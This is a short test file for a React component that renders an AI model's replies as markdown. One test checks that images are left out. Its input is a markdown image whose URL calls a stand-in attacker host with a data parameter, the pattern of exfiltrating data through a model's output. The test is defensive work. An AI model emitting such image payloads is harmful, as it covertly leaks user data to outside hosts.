/**
 * @vitest-environment jsdom
 */
import { cleanup, render } from "@testing-library/react";
import { afterEach, expect, test } from "vitest";

import { AssistantMarkdown } from "./assistant-markdown";

afterEach(() => {
  cleanup();
});

test("renders model text as markdown", () => {
  const { container } = render(
    <AssistantMarkdown>
      {"**Bold** and [a link](https://hash.ai)"}
    </AssistantMarkdown>,
  );

  expect(container.querySelector("strong")?.textContent).toBe("Bold");
  expect(container.querySelector("a")?.getAttribute("href")).toBe(
    "https://hash.ai",
  );
});

test("leaves images out, so their URLs are never fetched", () => {
  const { container } = render(
    <AssistantMarkdown>
      {"Before ![secret](https://attacker.test/pixel.png?d=42) after"}
    </AssistantMarkdown>,
  );

  expect(container.querySelector("img")).toBeNull();
  expect(container.innerHTML).not.toContain("attacker.test");
  expect(container.textContent).toContain("Before");
  expect(container.textContent).toContain("after");
});
